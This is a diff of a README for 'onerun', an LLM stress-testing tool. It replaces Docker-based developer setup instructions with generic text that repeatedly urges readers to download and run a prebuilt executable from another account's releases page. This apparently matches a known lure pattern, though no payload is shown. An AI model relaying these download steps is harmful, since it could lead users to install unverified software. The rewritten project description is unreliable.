@@ -1,123 +1,74 @@
-# OneRun AI
+# 🚀 onerun - Stress-Test LLMs with Ease
 
-**Open source AI agent testing and conversation simulation platform**
+## 📥 Download Now
+[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-blue.svg)](https://github.com/PinguChileno/onerun/releases)
 
-OneRun helps you test, evaluate, and improve your AI agents through realistic conversation simulation at scale.
+## 📖 Overview
+**onerun** is an open-source framework designed to stress-test large language models (LLMs) and conversational AI systems. With onerun, you can easily identify hallucinations, policy violations, and edge cases through scalable and realistic simulations. 
 
-## 🚀 What OneRun Does
+This tool aims to make it straightforward for users to improve the quality and safety of AI applications. Whether you're a developer or a curious user, onerun helps ensure that AI behaves as expected in real-world scenarios.
 
-- **Simulate realistic user conversations** with your AI agents across diverse personas and scenarios
-- **Generate evaluation datasets** with judge-labeled conversations for testing and benchmarking
-- **Create training data** for fine-tuning with preference pairs, critique-and-revise triples, and clean JSONL exports
-- **Automate QA testing** by running hundreds of conversations per build to catch issues before production
-- **Surface edge cases** that manual testing misses through adversarial and varied interaction patterns
+Join our community for updates and support: [Join Discord](https://discord.gg/ssd4S37WNW).
 
-## Prerequisites
+## 🛠️ Features
+- **Stress Testing**: Simulate high-demand scenarios to challenge LLMs.
+- **Realistic Scenarios**: Test AI in environments that mimic real user interactions.
+- **Policy Compliance Checks**: Automatically identify policy breaches in AI responses.
+- **Extensive Logs**: Review detailed reports on simulation outcomes and AI behavior.
+- **User-Friendly Interface**: Navigable design tailored for non-technical users.
+  
+## ✔️ System Requirements
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a compatible Linux distribution.
+- **RAM**: At least 8 GB recommended for optimal performance.
+- **Storage**: Minimum 500 MB of free space.
+- **Internet Connection**: Required for downloading updates and accessing certain features.
+  
+## 🚀 Getting Started
+Follow these steps to download and run onerun:
 
-- Docker and Docker Compose
-- Node.js 22+ (for local development)
-- Python 3.12+ (for local development)
+1. **Visit the Release Page**  
+   Go to the [Releases page](https://github.com/PinguChileno/onerun/releases) to find the latest version.
 
-## Quick Start
+2. **Download the Application**  
+   On the Releases page, you will see various files available. Look for the one labeled for your operating system. Click on it to download.
 
-### 1. Environment Setup
+3. **Install the Application**  
+   After the download completes, locate the file in your downloads folder:
+   - For Windows, double-click the `.exe` file to start installation.
+   - For macOS, drag the application to your Applications folder.
+   - For Linux, follow the instructions provided for package installation.
 
-Copy the environment variables:
+4. **Run the Application**  
+   Once installed, open the application. Follow the on-screen instructions to set up your first test.
 
-```bash
-# In the docker directory
-cd docker
-cp .env.example .env
-```
+## 📥 Download & Install
+To begin your journey with onerun, please [visit the releases page](https://github.com/PinguChileno/onerun/releases) and download the latest version.
 
-Edit `.env` with your configuration values.
+After downloading, follow the installation instructions to get started.
 
-### 2. Start Temporal Services
+## 🛠️ Usage Instructions
+1. **Launch the Application**  
+   Open onerun from your computer.
 
-First, start the Temporal server (required for workflow processing):
+2. **Configure Your Test**  
+   Select the type of simulation you want to run. You can choose scenarios that focus on specific behaviors or compliance checks.
 
-```bash
-cd docker/temporal
-docker compose up -d
-```
+3. **Run the Simulation**  
+   Click on the “Start Test” button. The tool will begin the simulation, collecting data on how the AI performs under pressure.
 
-Verify Temporal is running:
-- Temporal UI: http://localhost:8080
-- Temporal should show as "healthy" in `docker compose ps`
+4. **Review Results**  
+   Upon completion, review the detailed logs and results provided. Use these insights to make improvements to your AI system.
 
-### 3. Start OneRun Services
+## 📞 Support and Community
+If you have questions or run into issues, our community is here to help. Join us on [Discord](https://discord.gg/ssd4S37WNW) to engage with other users and contribute to ongoing discussions.
 
-From the main docker directory:
+## 🌱 Contributing
+We welcome contributions! If you'd like to help improve onerun, check out our [contributing guidelines](https://github.com/PinguChileno/onerun/blob/main/CONTRIBUTING.md) on GitHub.
 
-```bash
-cd docker
-docker compose up
-```
+## 📄 License
+This project is open-source and available under the MIT License. See the LICENSE file for more details.
 
-This will start:
-- **Database** (PostgreSQL on port 5432)
-- **API** (FastAPI on port 3001) 
-- **App** (Next.js on port 3000)
+## 🔗 Learn More
+For more insights and the latest updates, explore our [repository](https://github.com/PinguChileno/onerun) and check out the documentation linked there.
 
-### 4. Access the Application
-
-- **Frontend**: http://localhost:3000
-- **API**: http://localhost:3001
-- **API Docs**: http://localhost:3001/docs
-- **Temporal UI**: http://localhost:8080
-
-## Development
-
-### API Development
-
-```bash
-cd api
-# Install dependencies
-uv sync
-# Run with auto-reload
-make dev
-```
-
-### Frontend Development
-
-```bash
-cd app
-# Install dependencies
-pnpm install
-# Run development server
-pnpm dev
-```
-
-### Database Migrations
-
-```bash
-cd api
-# Run migrations
-make migrate-up
-# Rollback migrations
-make migrate-down
-```
-
-## Project Structure
-
-```
-├── api/                 # FastAPI backend
-├── app/                 # Next.js frontend
-├── docker/              # Docker Compose configurations
-│   ├── temporal/        # Temporal server setup
-│   └── docker-compose.yml
-├── python-sdk/          # Python SDK for workflows
-└── README.md
-```
-
-## Stopping Services
-
-```bash
-# Stop OneRun services
-cd docker
-docker compose down
-
-# Stop Temporal services
-cd docker/temporal  
-docker compose down
-```
+[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-blue.svg)](https://github.com/PinguChileno/onerun/releases)
